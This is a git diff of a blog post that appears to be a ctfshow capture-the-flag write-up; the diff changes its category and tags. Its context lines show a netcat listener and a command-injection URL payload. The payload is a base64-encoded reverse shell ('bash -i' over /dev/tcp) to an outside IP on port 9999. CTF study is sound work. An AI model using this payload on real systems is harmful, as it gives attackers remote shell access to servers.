@@ -6,8 +6,8 @@ date: "2025-02-21T16:38:05"
 lastmod: "2025-02-21T16:38:05"
 image: ""
 license: ""
-categories: ["ctfshow"]
-tags: []
+categories: ["赛题"]
+tags: ["ctfshow", "组件漏洞"]
 ---
 ## web580
 
@@ -1024,6 +1024,3 @@ nc -lvnp 9999
 
 /download?uri=ftp://156.238.233.9:2121/&file=|bash${IFS}-c${IFS}'{echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xNTYuMjM4LjIzMy45Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}'
 ```
-
-
-
